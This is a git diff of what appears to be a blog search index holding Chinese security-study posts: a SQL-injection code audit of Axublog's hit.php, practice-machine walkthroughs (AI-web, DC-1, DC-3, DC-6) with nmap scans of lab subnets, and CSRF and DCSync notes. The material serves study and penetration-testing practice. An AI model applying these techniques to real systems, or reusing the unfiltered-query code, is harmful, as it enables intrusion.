@@ -4,7 +4,7 @@
     <title>188jianzhan SQL注入漏洞代码审计</title>
     <url>/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="6f2d5d95270e6c32305043eb809fadac3ae1318a7da525406fc480a7c665c37e">b5d22db53bb6989178f068c6a5b87a69b2d6ab453b95801e6361487540b5d6f085492c34e353fe3485d1794f55075b4ce23267a3fda7885e69a35e1296ce8f837bd921b50bf1fc8271f6d7eb13315fb3ff0132f64a381efb9dd4d6fcfb0b6f1e4b8e62491087529c0d1434633a44812273d0c1a9e57353b927c896e80de0acdbbb2a9379106f9f0312ab8b1f53aa776cc7e7a1b07756cbed7b040c891d218301af20899d59ec3890a0a521581442baecaab813d75ff92a4dbed3ccb70d86646bc0df0843ae70a2808641cfa93906bc95d67710e2241bba9cd955d93340e28f9c35045f7d50eabfe58f34c4b70c71e64f0fb18321a7cadb6e59c36368f25f4fcffb55731fd69b27ccae987116bf08e2a945b8a25724343128b8f8c41055ee12a858e45661ee6236de0d4ac9b8b37fb0a68ee94bbce558da78f2d46f03e4348281da980ab63a525aec9ea5809f1e989f37bdc3ea9998c5f8ea2ff7a50a5126084a2e2fe47c8278f10faae54baa26e837fb3b398da60085487d6e25e5ed5a2457f2a6f39032442de64292b992220dd80375bdd56647fb49ed75a0af437c28c76dc3ddf6994aa541e84258497a89a7f676d0b72208d5e28b3c423ee1c695a8e0ff508631c38238f9b4a0488b41affdaccf87f4116df475c4140f2ce85b42b205b91a4ada94f8049b08b3419ef8e2aca42351c8bbf6d1045690a53f85d181b198fa7ffb14d9f7dc554c7f4591e36200630eb5684481ab6281d80322918e33719543c1949f632e3fb0a49738363d22f2f0fc29633d5bfd73e38d79151894e58c3cb42b154b40a624217ac49d5b616cf53f6b5f530762bb848ba43379366031923fad4d99be993f10dfd4eb2389b6c178a6d3a60c08f9eda4474b4fdc12f7f7451c2995221478d61cead5d7ff42b30bf35c0c39b233086a267414b98227a3f9dd83010c009fff0eb835fd2b6d557d00013f5b5c64b377c0070977e5faae252657aba154b6e8e4bdba2718d4c7d8cbf457a6c9ad6a5701e5f0d1535f860fe2fe6ef49d5000efffbdb9c1adc101a676943629748b1ad909e1c291a6d981822f7b86d10a4b64ab4fce798ed764057c39ca0291ec2ea3eb8421f917dd8d4be4c385b79ed10ecb604af1ca8f1ddcd4ded8cb95468bddc302d2d2ca9b3112b0a8a7fbf9abea20b1b850ab07abf8a7eca08c8442b921ef43346cf851baeb0dd9c1f04ea2d28c4ace5939454aeae496ee107ff6e76cd8c8ab0e483f50b97e7460dc6fd05354576f17bef26e2cde1e36d50426e58d0be6a1311c0787f7b245936dc03271b58e0e7b80f96fe5e58e607f9ad4bd61a457d47ffef2a75a571255c065f7b470f3f7b79e2dc50f16b09e3a79cb6dfeef4b3e760b1eaec2c7cf65cf6d47a970cc9abba5f8e2d3c9b30ede07d3230d32986b53af6fc4997fc64f98e54533625837f4fdf96cec83d560c3b220b323dcb05606a2c08299fff6fefd5df1edadd436bef061119f03b387deac21d02ac0fa47f95933a1002a883f969dee8e2c4497b92ae58f7c0a59aa1cc5c38be424a489b0c1eb1f9b8badaf5e9faa063832e34d009e1235eefea0674d1e1216c098047932ee49c7d207db40f35d218dc409ec097cf2b4ee7d09b560b8105ba8b968b4d58a82b5c31b76fda7cc7cc68c9670091e8bc4e1dc894994ba378e454637d789809bcc42b76841423aa57b36b0d089b6b1440460e006e5d6a15e8b92214eb0322e90b29114b87b28fb0ea06ca79cd7a3975ca3abbf6a76d93aadd6a7de65eeb535bbb541d3c7aa33cbb31ae1b18489c22339e490ca8e323ebf0ff9f3c47ba3c68ded57af76c0faf73802ae7465ec8953865f7a0d1f62d7789eb3f10e466a076951cde189070b6b7ac96b4b84836644392408c3704cf7ef6596a5ff17d74dcd1362cd02b83bf1a2e394f7892a180a3cf3b39d27f2013e0085b79b7e5a681a582b663db2af2b8e67e2170854a129d4b443b22b53b689412bd5c9de11724fe785809459f82aec41abf1ee92a1ff853a4b681a3a91024382c60515d1ce04d250b5cee5ce8402eeb9de107b54f4a21cc5fa854f1daa5f9e6854fe6f7569d8ef8ec00c8af8af28efcc6b096acb71b141752518f587fed196585648ccde03f66e7ab031b506beac842edd650a830f5dbf39cf436ba169da84c36a539930f19a6249aab5368e875d901f5faa8c44422c2cb87cb3ea4c63caea75330e728c8a83926a31559bf1fa6330a9885af1ab0bb410e3baba1f45c0993e86a9752e9b315260db6bcdb1a1c5a315db984e2cd047dac928945b26bff73b59fa27106a14a3286853c8a338706dc219665e0e3ebe8c7269f63afec51e38c1bee177af15b1400dba529577df023cbc63f10161ffae43bdb10affa30c44384a54389a66102f50f28ed5ad709af24e28ff04565d976092037f0ffaa2186f672d51c5e7e9678d16d6f59f26a89f6193410314cb45ccf08bf080a055eceaa54f2ac618cc4b43a7edf9507df177f4dc229e0bd8d538c04b3b9426fce58fd2c12ca955f7ee684111d903b33358a2f34c351e0a86859548f8765e30cf0f52518d0de4803b9daafba0f897c9f4c460f2b1d2f3133fdcbd00e17595eff9436b07904d3215f98bf8dbac5c47ee2308a65f72441e3781cae5faf5b3f04446b1ea6382c6b0432ac8c1b4b149e6eb96e0452dac09f1cd877d3f1099df0681b57b92a0f5489f76070668fa5fc255603acafd2d2545c82223ced13a63c96a44849c8416b0cdab11b2d66b343cd20726a5593714708d763859cc9f46ee10852ef69186f855917911804f5b5b8216303784370e443458d2e1ed0f532555929aac7097b3e568da70b34a0e11781764b90ab295a2d39837b44018018c9dd13c09330cd6398ef5b60b14e8c796c594aba3c7bf944f6e6add1c9b34f182ab9b952b86b094c8c0cc7ac9ac88e57cbf094776ec5699208b63ce2e384f8309ba790ae4b7dc57a1efd79a601e853d9175e7f23b559fb1cb6c827c3b4adbedf286f1680abbc04e9e9d014a40ba8fe0ca1f6a80c7fe360bfed9cf5eddb12efd4d2d40cc50c6df8c331616770c01d389ea4999d7b0e584641a5a133d737cff5b80dc68216a7abef78253f9be4b3b3578b91b8ad69b325babb40297329aa47e23731de90056f70daffe58b1fbca82374bfa5d4e187247461eda6b4f78effb58283b2feca28d61809fe4020985bfbaff2a09ce143823d44c7710ed4efcf603a88f6cd0fdeafc86bb5c14bf83b58854cc64214c9b23f082d21f3909bc4114668f44d347dfdc3bc1c9772b1cf91ad5f3a97004a0ea18e0d92c078802a2f6657921809e3fff3103fcf1196c0993a938dcfbd5273a774eb78ad1a33567a1f149cf5076df78a41501c811962fe773843b5334eace780cedd9fe8709a1f618fc1ca7ea5ae9d8d100fd49f2e90828b84e4fb69427b1aab1bf573398ff0ccfcb9a7ced96a7261f998e35b4e686c019843c861f88295c6c1b6879555c7c84c682dfc2dca1a4dc080b92ab0cba87d80ef44b0281dafe6d4c17c6a8219b20ec6fab0223fe840acd8b3c5d22504892f5620bdc79aaefcfef88f537326caa693f7c3af0ba98f58cb5bd24ba10df301ba835d6dabb757a96b9859aa27ccebf8c15e34f221ed0e9aeb6b5167b5ba7a0ff2052872c9ef955cafc49fa6d0188910897e1dc580c386057be94b67b82cdfa969bb08b6e65585170545c026f9564903153f35b49b7737ededf0ee524921c48c2307c3bf5d03ef6880f5c55a169b75b5f701bcdaac341f518a3871731a18961bfd4626498de9781d770ecaa3b8e83674097e79927c594a23169d0ff8a2a3fd6536e82499550dbf62c2d367ef8fc6e1b25e0b451b365b4a1594a656f4f19a1b4210a0db70ce49d67a17be5498aec82ecf2cc1c25c67a14721273243d44d89bf13b67ef33920672d802c8d8461237811ce13f484b2343c3587c34175b5594b6349406208522352c47cca2a599e55ebeab9417e3d43f04ed0f9a4f38a966d2ae2c86f62d868743adc4fc49e539db93e3325f74ae648342c7038b3d8185cfb717d10e164c489685891d9b6c43bf9ddcf68481cc33e51c7512745fa247c64176f1b8cfdd178e1925afef0f208441df6cff25e53b70278cc066626a1f2989884c3234c4e083093761150614d897f065bc0990cd6d8a1c5b8c016774fa5ff4905024eda8807005abaafbeed52106d235759e69fc43d170c5ddb42311570a626d291b9c302e5c36c9f61fbf9c706cebe720ae07535296a9ac599f24bcfb322c8948931d2311aae306ba820401979e80500fe29b3a612b1aa18a4cedc59ab0d4d4b4d40a9497dac78c97467b6de1033fc112019c22ee276402928544ec4ca8e2c930a13ebbf9df99cf19ee74044a273158c916ae7578e3533958b10701795d41d0e5d08d060dcd3b7161dc8ed68d6a946a382815c1453fc571f37b587cb10ae4a3286be58a5c2eec049584efa3570be652d43142494bc53f3e5cede592e8f06624a9647b1994d77de9b3346cce49106d476f956a76dd1b377a974734f83b72b06b169fd814437cb7d00ffdf293cdb764492108615ede1f85eada1c8d98299e50286e4fbb8094f435b95edec940bb7570a847b244df4f3a42098db66be87ad89f18e03cae79f9e31a60c6995432f988366723dd66cc9f637a2cd96aefa9e96eb9716cdb2ac831024d253d145c627230c0fe60a3bb463997c42d282d2721098b6ce526de21a8dce80b5346598c8ac6b95a2c1ee12f0dafe285b4e213a932</script>
+  <script id="hbeData" type="hbeData" data-hmacdigest="c28abad9e9b1236ed0617463be3c192b5d1d584c02d4dfee0db644ba03445bfa">b5d22db53bb6989178f068c6a5b87a694cbd7b06e5e57389845ce73a10fce27a7aaffb52da50b19b3826720d35d22992defc4d7347a5ce8b4836e0697e0c988c39b26469b7a4c93d13322e6ec1ad872986462bd4405a759019a481438332c26bcc0370674257caccf4afccbfbade01c24016dbd1e578e9d64829d58d7769f7a883cab45d608f94f3c4f23875633400acbc14075910d51599a707ded5e107cabf61833124169fb19a10e15bd2409982b89d9c092d5e42abe2554f0b5d595c618ce2c97b151eaebd876db54ef29442be01b8e6184286dd0215b5eb2ce49df2ef20a467749962a20a0b67b43068c8ee1e0d88d63722000c8b57f865f9529ed3c89300d9bd791f36baf71aa97606d9312c65024ee9fe6ac33d12d3d6d394f4f23ca8c04565511bb92163040f52d48bbb6e72ae94b06bfff2fd1e7afe1fae497bf15b5110d5f7a78e095408fba73d8321aaab7a4ecfa7dcc81f89db7e7d050963126d6de01103f5f6656a9f73c8cb4a5c1058c3c5bea10c373cde2c4b8026adfda84fb28267f34cc260afcbc1d1c96e7ad73ab531ebb7b222767005437693f18d9ac37d2c7f5dddfd26cec62d4da448444b9fdd3cf65cf47e5652fd19e9e88ba587b88ef33c3283f870391cece8d7d21071d8bc49d03f3601d8b4ff1e958f5bcb2068161abbfba383975bc27e6de78e4e23204341c1648ab8c00c5b5aab88494f71690c8d387613acf104bbe529bacd53ea9ec2cfa71f9815c2b116ad367fa968150c2c443119ceec82663528799bb97cf2d7c8be31a4d12e9ec59261712834d30bef664ac38ed97e75f279169c593068f01af01970e447cfae287f681823dabd2bb73138d26a13daba7fc2b44a48f7f0dc6b0f42fb1c6de827d057cfa6ccf2f87426813ec8017ae1ef30bb56f8ab1c99396f6ec2657fe360daf4800e3cbffad046d83a77ba1f59c4c5ca23f638bed282b4a2b95f6250743f8ec171e5f2350550633313561b377fdc4708f2ba6daf1f682f1d268687b3ea5ccfe3bd4cecca201a5919ac2f71b0ef6717bf8cad87ad1b3be01bd2de1b1c6ff4698b0a2223592b749a0eeff3cda2c0f707270b1655eb4a4a94aa0576379c2d8c4aacb4a000b87683a7c197127ca3fb500c6dc88a383f1815fbbd176b30830a9049156413c1bf228d9ed1de52ac14fe8c6e5b3ec24956f76d281e7882d8002eb8ee1e050079cae1e787403e9631a437713945c77b4f419606bcc602175db235841cdce20b64126876902d8546d4954f4feba9e7daad622e2cc7005552ff4bbf9615ad4492d1c9b81fbbc9767b8e4466f972c368e3cf6fa785238f027040d62786d41e8f43f3953d8aa410050d7fec529f419c7925f011cdf4467bd80dc7c3864e3343988549744c6ab2b43bdd8fe9530f5f86cef2d703e68db10604b5f481b23c2b81e88ad2f829dbbc5905700545831e69c94add869495ef160c00bf7e85a8f2f26260b2b6bb40d3be9ee8a6fc47d3f5e2215bccb19ee780f73ed8d925a1709797fdaffb3a5db08db2257926809ab1b9254742e880dd670ce1dcd48fcf5bd49d8c6bd324c4fb6d4cde397011f7706e2b3331b23c50591e0970a642bd1106b6bb4ea3aa0cadcfa406044fb3f22b29b51993bb26f98ac623a38c80155a7be697e447143215021b66adce0adaf294af27996802f50dab317b3611b05406e2cff5e6a31553187899865c0b05277d3231982cb592ebcd4eaefb10dd520f875633d864bfd3a233ce2e57cbd4d830288b9501d510e393c1872e6ff2e3e3aadf96b308632f256543e6f8918c57efd22c45139fba46f02810109eed333431d74596706c6ea951033fa508daf19a0b4915bfe62d90e55fb5f65579956e6bf798f719caccbaa232cc2a528f1fe78f08f74072bee62dd2640e5f391832cf6590409844de3a6cf11505a65c6dec4380e71c3fb327eeafeddfae5ef7e797eb63f4e488f91b7c747ee1c25bf8fa2c0c837d45229ee6c3c1cfe6eb7c0e92cd19cf5caf306db46e264ebbd51f900d243eab587608aee0120bef0ace716c35a25b98ead28683fbba86c9e2dd5ab6e0b253dd2c76b160d808095800aa2a5bf19f321a7aff7b24b758ce1cef2a475fecd7f0982686ab05e0dadc485e9b031b91ca94283e5fd213c70aa8a174f5a6adb01c66503ba084589a3fd1de722ab69a9a9d2a54f6dc9c0901391a444004f5f3115efc513d79e93db8d867d8f40969139c7ae025ce5718ef8ca48f8c202c376486c9de91973269b0fc5683c02ba29f02d1dca5f1faf9dfedb17b955f45b6cdb1b989f010c3a46c261037a7312e7bfba2b00b13c7969c619a32ccd8ea6f3587b0259d0d604934b5b11b10ed1247f8b719c408a8e64c0e261710ad8f86274e3009edd5edb2506c965d8225d7b454f0a8ac8922b0a16e6f9b722b53ed4d8b1fb7f2179c958983a97828fba10a2f8b7afa2d6ff08a2e2eefb33e32bc7542b42f75523a05041a66fb5f5cc3ee2c1a4f646a8cd782b92a0194c523d675844a2ee577b462711427ff65e5faf3a52b5181a11be4bfb6f07ee19e920365bf37dd748411f4d55f3d2a13ccb8e75951ab4766f0c6dc1c24e53de33ed09ee81657e046bb87e9da7978b0ada054577b90e6a61c36530605ce069ace95490b0b563033354459e4903849ab46010905c31fb01841661a8cb7fd85682baad7465880398db665b512e9507b17a8a33f91e519fd9df377a94f00dcebca73a1c8d41f1e334986826d251183770aaa9c826d16e993c991a70aeb763f9747189eeed35e753e3850a9b51f29d37bf2d3b7e460c579629f2947dcbe0f697feb16047f7c8a689497ab1c5e9239ad69261e0dbdd5479bd8a928d8419319bd5ef094ae900549deb5b2a56e8c32f6afff7f98c004a59421f06d390d8c6ba7bbe5eb8f8bc7402cbd384345fa09b614aaefddbc79f6260922c0215db9da27bf0b9abd4b317c1ac27cecfdba156a1467e780b1620d372a10b8cc921c5a9c9d797653f72d89b593ded7c91bcd72cb86a22b879035bd7f16c16cc4c638dbfd74418ae70cb38a7d8816a16aaf9852e7b1cf3a9879c265649c34c2f25490141d2e1fe41ee20d8a69bc49e7d496c848a12fa8e32315ef40352a73fda0762dc6b38162c537f3e0464c546ffdfa4043d2b4eac5bb5764717d3ff0e6bc852fccef6880af0d4bdacefbc781385a169c1c5d32afa30ff3d7a20ba5f007dd76406d31a6867f4164633a2d4799c1259ea956344b85c8e2b1ec8be0d0673ac94d48edaf8c603f46e884efa9a4b1a3d7e54ee894abc8f7827129ce45060f50c9f8394932650e97c362f45d94e57fe664c9f75546320900ed47f113fce83e4333a05037438e013b8ba3e2a644504ca03801dbb0cde097ca9396e842d90de94f5fb912809b6b8118237e946989b9584ce172e91c958372e069bb2277c750e3b5df94226731686c39c77a99744a44e168d5364499a20a10de1eeca3000d6a3c3ce95edf576866d256c292e37c98c11e837dec9ec34b56ac9e5a98770cdbe0adc2cae994e715d2eb5d401565603619ad803bffae37f0b2163848d73450b00f3028f4e6fd8fec20dec27c14034d73fc3a568f1c96af07faf065454b6f1a5d9add152de56c64908ef826ad32a2a0af84ce26da40582a2b0c1426acb0f78eb7b9e269419d3e2e863bdbab12fc910d2f322700d1adec82b860092e3d9d518390c1edd7f421c644b5dd2e1671f792228c27635c3e1f98af0305d317526c0b86ab7b51228371e17cee7d73dbd2492e470d978f67b702c57d2cc558a9b063816c36b3e2991b9d340b29c2c3cfecff5ec2bf004e51bb5ad69ae75dc4bc25ec952491a0b95ed9f21b2b8854296e6e37bab1b83244ced563a6d708fa42dc7c277a78112386854eb835ff2773d45b2838eac07e65cc0812dc2c02d1251815e0a6777f8fb319a467936da5863fc7482f4e9576513e2bf602289f957894bfaaafa51b1e9904b05ecb4beeb3a9fd698e52ac7b78b9d66cb62b70f3f9c3c7c1cc240cfe2c82c64a070118839623d73031e12ad75f165b5ab53089a05ac74caba711e9c99a03af7eff6aa0127ae299ae77c4df493ee4c79e9d29b5daebb4290b89d9859cc924e2ec3a6daecd218602f0adea1d3587abd47e9f7c2f7af1228fcddc48b17b42d6766e72dd78854733b8757a4131865b9ca7d869e0dcd334632d288fd142d46e1ae1faa75181f6ab495da949379a1151cbeb4c9f12046f7e0ea727021f92f23abb81fa1f525401ac29712567df38ccf345ab4a35b9cc26b9ccb48720a5792bb8070a07c74afe1f98dce3b5959fcabd5998e883de0f10cb3cf43fe3bf00d6c920eaa87a76f462a526235ddfd502d12560b51630c37d7670b5f594809243b4c1664aa1431613f1f2eae0a995e49157f71796fb017331d703054d44c5e7c4b83d94</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -25,7 +25,7 @@
   <entry>
     <title>Apache中间件漏洞学习</title>
     <url>/2020/04/02/apachhe-zhong-jian-jian-lou-dong/</url>
-    <content><![CDATA[<h3 id="Apache中间件漏洞复现"><a href="#Apache中间件漏洞复现" class="headerlink" title="Apache中间件漏洞复现"></a>Apache中间件漏洞复现</h3><h4 id="关于apache"><a href="#关于apache" class="headerlink" title="关于apache"></a>关于apache</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p>
+    <content><![CDATA[<h4 id="关于apache"><a href="#关于apache" class="headerlink" title="关于apache"></a>关于apache</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p>
 <h5 id="Apache的目录结构："><a href="#Apache的目录结构：" class="headerlink" title="Apache的目录结构："></a>Apache的目录结构：</h5><ul>
 <li>bin——-存放常用的命令工具，例如httpd</li>
 <li>cgi-bin—存放Linux下常用的命令，例如xxx.sh</li>
@@ -155,7 +155,7 @@
   <entry>
     <title>Axublog代码审计学习</title>
     <url>/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
+    <content><![CDATA[<h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"cmsconfig.php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"class/c_other.php"</span>);</span></span><br><span class="line"><span class="php">sqlguolv();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$g=$_GET[<span class="string">'g'</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($g==<span class="string">'arthit'</span>)&#123;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];        </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($id!=<span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">$tab=$tabhead.<span class="string">"arts"</span>;</span></span><br><span class="line"><span class="php">mysql_select_db($tab);</span></span><br><span class="line"><span class="php">$sql=mysql_query(<span class="string">"UPDATE "</span>.$tab.<span class="string">" SET hit=hit+1 where id="</span>.$id);  <span class="comment">//直接将$_GET['id']提取的                                                                      id带入sql查询，没有经过																	  有效过滤</span></span></span><br><span class="line"><span class="php">$sql = mysql_query(<span class="string">"select * from "</span>.$tab.<span class="string">" where id="</span>.$id);</span></span><br><span class="line"><span class="php">$row=mysql_fetch_array($sql);</span></span><br><span class="line"><span class="php">    $str=$row[<span class="string">'hit'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'document.write('</span>.$str.<span class="string">');'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们尝试直接传入payload尝试：</p>
@@ -281,7 +281,7 @@
   <entry>
     <title>AI-web1.0靶机学习</title>
     <url>/2020/03/12/ai-web1-0-ba-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
+    <content><![CDATA[<h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt></p>
@@ -371,7 +371,7 @@
   <entry>
     <title>DC-1靶机学习</title>
     <url>/2020/04/03/dc-1-ba-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt></p>
+    <content><![CDATA[<h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="/2020/04/03/dc-1-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt></p>
 <p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p>
 <h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p>
 <p><code>nmap -sn 192.168.153.0/24</code></p>
@@ -449,7 +449,7 @@
   <entry>
     <title>CSRF漏洞学习</title>
     <url>/2020/04/03/csrf-lou-dong-xue-xi/</url>
-    <content><![CDATA[<h2 id="CSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞笔记+靶场实战"></a>CSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
+    <content><![CDATA[<h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
 <p>​    从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p>
 <p>​    可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户</p>
 <p><strong>浏览器Cookie机制：</strong></p>
@@ -617,7 +617,7 @@
   <entry>
     <title>DC-3靶机</title>
     <url>/2020/03/12/dc-3-ba-ji/</url>
-    <content><![CDATA[<h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
+    <content><![CDATA[<h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
 <p>使用nmap进行二层主机发现</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
@@ -704,7 +704,7 @@
   <entry>
     <title>DC-6靶机</title>
     <url>/2020/03/31/dc-6-ba-ji/</url>
-    <content><![CDATA[<h2 id="DC-6靶机学习"><a href="#DC-6靶机学习" class="headerlink" title="DC-6靶机学习"></a>DC-6靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p>
+    <content><![CDATA[<h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p>
 <p>然后我们首先考虑获得靶机的IP地址。使用arp去发现内网存活主机，从而确定靶机IP为192.168.153.137。</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
@@ -752,7 +752,7 @@
   <entry>
     <title>DCSync与DCshadow攻击学习</title>
     <url>/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="DCSync与DCshadow攻击学习"><a href="#DCSync与DCshadow攻击学习" class="headerlink" title="DCSync与DCshadow攻击学习"></a>DCSync与DCshadow攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>DCSync与DCshadow是域渗透中经常会用到的技术。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>DCSync与DCshadow是域渗透中经常会用到的技术。</p>
 <h3 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h3><p>​    2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p>
 <p>​    DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。</p>
